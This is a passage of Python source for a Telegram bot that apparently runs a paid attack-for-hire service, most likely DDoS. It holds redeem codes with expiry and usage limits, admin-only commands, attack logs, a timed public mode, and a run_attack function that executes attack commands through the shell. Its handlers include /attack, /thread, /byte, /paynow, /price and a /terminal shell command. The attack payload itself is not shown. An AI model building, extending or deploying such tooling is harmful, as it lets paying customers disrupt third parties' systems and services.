            parse_mode='Markdown'
        )
    else:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*⚠️ No attack history found for this user to delete.*",
            parse_mode='Markdown'
        )

async def run_attack(chat_id, attack_command, context):
    try:
        process = await asyncio.create_subprocess_shell(
            attack_command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")
    finally:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*",
            parse_mode='Markdown'
        )

async def generate_redeem_code(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*❌ You are not authorized to generate redeem codes!*",
            parse_mode='Markdown'
        )
        return
    if len(context.args) < 1:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*⚠️ Usage: /gen [custom_code] <days/minutes> [max_uses]*",
            parse_mode='Markdown'
        )
        return
    max_uses = 1
    custom_code = None
    time_input = context.args[0]
    if time_input[-1].lower() in ['d', 'm']:
        redeem_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    else:
        custom_code = time_input
        time_input = context.args[1] if len(context.args) > 1 else None
        redeem_code = custom_code
    if time_input is None or time_input[-1].lower() not in ['d', 'm']:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*⚠️ Please specify time in days (d) or minutes (m).*",
            parse_mode='Markdown'
        )
        return
    if time_input[-1].lower() == 'd':
        time_value = int(time_input[:-1])
        expiry_date = datetime.now(timezone.utc) + timedelta(days=time_value)
        expiry_label = f"{time_value} day(s)"
    elif time_input[-1].lower() == 'm':
        time_value = int(time_input[:-1])
        expiry_date = datetime.now(timezone.utc) + timedelta(minutes=time_value)
        expiry_label = f"{time_value} minute(s)"
    if len(context.args) > (2 if custom_code else 1):
        try:
            max_uses = int(context.args[2] if custom_code else context.args[1])
        except ValueError:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="*⚠️ Please provide a valid number for max uses.*",
                parse_mode='Markdown'
            )
            return
    redeem_codes_collection.insert_one({
        "code": redeem_code,
        "expiry_date": expiry_date,
        "used_by": [],
        "max_uses": max_uses,
        "redeem_count": 0
    })
    message = (
        f"*✅ Redeem code generated:* `{redeem_code}`\n"
        f"*Expires in:* {expiry_label}\n"
        f"*Max uses:* {max_uses}"
    )
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=message,
        parse_mode='Markdown'
    )

async def redeem_code(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    if len(context.args) != 1:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*⚠️ Usage: /redeem <code>*",
            parse_mode='Markdown'
        )
        return
    code = context.args[0]
    redeem_entry = redeem_codes_collection.find_one({"code": code})
    if not redeem_entry:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*❌ Invalid redeem code.*",
            parse_mode='Markdown'
        )
        return
    expiry_date = redeem_entry['expiry_date']
    if expiry_date.tzinfo is None:
        expiry_date = expiry_date.replace(tzinfo=timezone.utc)
    if expiry_date <= datetime.now(timezone.utc):
        await context.bot.send_message(
            chat_id=chat_id,
            text="*❌ This redeem code has expired.*",
            parse_mode='Markdown'
        )
        return
    if redeem_entry['redeem_count'] >= redeem_entry['max_uses']:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*❌ This redeem code has already reached its maximum number of uses.*",
            parse_mode='Markdown'
        )
        return
    if user_id in redeem_entry['used_by']:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*❌ You have already redeemed this code.*",
            parse_mode='Markdown'
        )
        return
    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"expiry_date": expiry_date}},
        upsert=True
    )
    redeem_codes_collection.update_one(
        {"code": code},
        {"$inc": {"redeem_count": 1}, "$push": {"used_by": user_id}}
    )
    await context.bot.send_message(
        chat_id=chat_id,
        text="*✅ Redeem code successfully applied!*\n*You can now use the bot.*",
        parse_mode='Markdown'
    )

async def delete_code(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*❌ You are not authorized to delete redeem codes!*",
            parse_mode='Markdown'
        )
        return
    if len(context.args) > 0:
        specific_code = context.args[0]
        result = redeem_codes_collection.delete_one({"code": specific_code})
        if result.deleted_count > 0:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"*✅ Redeem code `{specific_code}` has been deleted successfully.*",
                parse_mode='Markdown'
            )
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"*⚠️ Code `{specific_code}` not found.*",
                parse_mode='Markdown'
            )
    else:
        current_time = datetime.now(timezone.utc)
        result = redeem_codes_collection.delete_many({"expiry_date": {"$lt": current_time}})
        if result.deleted_count > 0:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"*✅ Deleted {result.deleted_count} expired redeem code(s).*",
                parse_mode='Markdown'
            )
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="*⚠️ No expired codes found to delete.*",
                parse_mode='Markdown'
            )

async def list_codes(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*❌ You are not authorized to view redeem codes!*",
            parse_mode='Markdown'
        )
        return
    if redeem_codes_collection.count_documents({}) == 0:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*⚠️ No redeem codes found.*",
            parse_mode='Markdown'
        )
        return
    codes = redeem_codes_collection.find()
    message = "*🎟️ Active Redeem Codes:*\n"
    current_time = datetime.now(timezone.utc)
    for code in codes:
        expiry_date = code['expiry_date']
        if expiry_date.tzinfo is None:
            expiry_date = expiry_date.replace(tzinfo=timezone.utc)
        expiry_date_str = expiry_date.strftime('%Y-%m-%d')
        time_diff = expiry_date - current_time
        remaining_minutes = max(1, time_diff.total_seconds() // 60)
        if remaining_minutes >= 60:
            remaining_days = remaining_minutes // 1440
            remaining_hours = (remaining_minutes % 1440) // 60
            remaining_time = f"({remaining_days} days, {remaining_hours} hours)"
        else:
            remaining_time = f"({int(remaining_minutes)} minutes)"
        status = "✅" if expiry_date > current_time else "❌"
        remaining_time = "(Expired)" if status == "❌" else remaining_time
        message += f"*• Code:* `{code['code']}`, *Expiry:* {expiry_date_str} {remaining_time} {status}\n"
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=message,
        parse_mode='Markdown'
    )

async def cleanup(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*❌ You are not authorized to perform this action!*",
            parse_mode='Markdown'
        )
        return
    current_time = datetime.now(timezone.utc)
    expired_users = users_collection.find({"expiry_date": {"$lt": current_time}})
    expired_users_list = list(expired_users)
    if len(expired_users_list) == 0:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*⚠️ No expired users found.*",
            parse_mode='Markdown'
        )
        return
    for user in expired_users_list:
        users_collection.delete_one({"_id": user["_id"]})
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"*✅ Cleanup Complete!*\n*Removed {len(expired_users_list)} expired users.*",
        parse_mode='Markdown'
    )

async def public_mod(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*❌ You are not authorized to toggle public mode!*",
            parse_mode='Markdown'
        )
        return
    if len(context.args) != 2 or context.args[0].lower() not in ['on', 'off']:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*⚠️ Usage: /public_mod <on/off> <time in minutes>*\n*Example: /public_mod on 30*",
            parse_mode='Markdown'
        )
        return
    action = context.args[0].lower()
    try:
        duration_minutes = int(context.args[1])
        if duration_minutes <= 0:
            raise ValueError("Time must be a positive integer.")
    except ValueError:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*⚠️ Please provide a valid number of minutes.*",
            parse_mode='Markdown'
        )
        return
    global public_mod_status
    current_time = datetime.now(timezone.utc)
    if action == "on":
        public_mod_status["enabled"] = True
        public_mod_status["expiry_time"] = current_time + timedelta(minutes=duration_minutes)
        settings_collection.update_one(
            {"setting": "public_mod"},
            {"$set": {"enabled": True, "expiry_time": public_mod_status["expiry_time"]}},
            upsert=True
        )
        asyncio.create_task(schedule_public_mod_off(context, duration_minutes))
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"*✅ Public mode enabled for {duration_minutes} minutes!*",
            parse_mode='Markdown'
        )
    else:
        public_mod_status["enabled"] = False
        public_mod_status["expiry_time"] = None
        settings_collection.update_one(
            {"setting": "public_mod"},
            {"$set": {"enabled": False, "expiry_time": None}},
            upsert=True
        )
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*✅ Public mode disabled!*",
            parse_mode='Markdown'
        )

async def schedule_public_mod_off(context: CallbackContext, duration_minutes: int):
    await asyncio.sleep(duration_minutes * 60)
    global public_mod_status
    current_time = datetime.now(timezone.utc)
    if public_mod_status["enabled"] and public_mod_status["expiry_time"] <= current_time:
        public_mod_status["enabled"] = False
        public_mod_status["expiry_time"] = None
        settings_collection.update_one(
            {"setting": "public_mod"},
            {"$set": {"enabled": False, "expiry_time": None}},
            upsert=True
        )
        await context.bot.send_message(
            chat_id=ADMIN_USER_ID,
            text="*⏰ Public mode automatically disabled after expiry!*",
            parse_mode='Markdown'
        )

async def public_mod_status(update: Update, context: CallbackContext):
    global public_mod_status
    current_time = datetime.now(timezone.utc)
    public_mod_data = settings_collection.find_one({"setting": "public_mod"})
    if public_mod_data:
        public_mod_status["enabled"] = public_mod_data.get("enabled", False)
        public_mod_status["expiry_time"] = public_mod_data.get("expiry_time")
    if public_mod_status["enabled"] and public_mod_status["expiry_time"]:
        if public_mod_status["expiry_time"].tzinfo is None:
            public_mod_status["expiry_time"] = public_mod_status["expiry_time"].replace(tzinfo=timezone.utc)
        if public_mod_status["expiry_time"] > current_time:
            time_left = public_mod_status["expiry_time"] - current_time
            days = time_left.days
            hours = time_left.seconds // 3600
            minutes = (time_left.seconds % 3600) // 60
            expiry_str = public_mod_status["expiry_time"].strftime('%Y-%m-%d %H:%M')
            status_message = (
                f"*🌐 Public Mode Status:* 🟢 Enabled\n"
                f"📅 *Expires At*: {expiry_str}\n"
                f"⏳ *Time Left*: {days}d {hours}h {minutes}m"
            )
        else:
            public_mod_status["enabled"] = False
            public_mod_status["expiry_time"] = None
            settings_collection.update_one(
                {"setting": "public_mod"},
                {"$set": {"enabled": False, "expiry_time": None}},
                upsert=True
            )
            status_message = "*🌐 Public Mode Status:* 🔴 Disabled"
    else:
        status_message = "*🌐 Public Mode Status:* 🔴 Disabled"
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=status_message,
        parse_mode='Markdown'
    )

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("thread", set_thread))
    application.add_handler(CommandHandler("byte", set_byte))
    application.add_handler(CommandHandler("show", show_settings))
    application.add_handler(CommandHandler("users", list_users))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("gen", generate_redeem_code))
    application.add_handler(CommandHandler("redeem", redeem_code))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("cleanup", cleanup))
    application.add_handler(CommandHandler("broadcast", broadcast))
    application.add_handler(CommandHandler("argument", set_argument))
    application.add_handler(CommandHandler("delete_code", delete_code))
    application.add_handler(CommandHandler("paynow", paynow))  # Add this line
    application.add_handler(CommandHandler("list_codes", list_codes))
    application.add_handler(CommandHandler("set_time", set_max_attack_time))
    application.add_handler(CommandHandler("log", view_attack_log))
    application.add_handler(CommandHandler("delete_log", delete_attack_log))
    application.add_handler(CommandHandler("upload", upload))
    application.add_handler(CommandHandler("ls", list_files))
    application.add_handler(CommandHandler("delete", delete_file))
    application.add_handler(CommandHandler("terminal", execute_terminal))
    application.add_handler(CommandHandler("public_mod", public_mod))
    application.add_handler(CommandHandler("public_mod_status", public_mod_status))
    application.add_handler(CommandHandler("info", info))
    application.add_handler(CommandHandler("price", price))
    
    application.run_polling()

if __name__ == '__main__':
    main()
